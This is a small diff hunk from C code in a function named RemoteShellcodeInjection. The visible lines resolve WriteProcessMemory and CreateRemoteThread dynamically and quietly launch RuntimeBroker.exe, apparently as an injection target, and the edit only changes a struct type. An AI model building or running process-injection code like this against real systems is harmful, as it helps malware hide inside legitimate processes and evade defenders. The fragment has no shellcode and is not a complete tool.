@@ -86,7 +86,7 @@ void RemoteShellcodeInjection()
 	printf("[+] Resolved the address for WriteProcessMemory dynamically - 0x%p\n", pWriteProcessMemory);
 	printf("[+] Resolved the address for CreateRemoteThread dynamically - 0x%p\n\n", pCreateRemoteThread);
 
-	STARTUPINFO startupInfo = { 0 };
+	STARTUPINFOW startupInfo = { 0 };
 	PROCESS_INFORMATION processInfo = { 0 };
 	PVOID newNotepad = pCreateProcessW(L"C:\\WINDOWS\\system32\\RuntimeBroker.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo);
 	if (newNotepad)
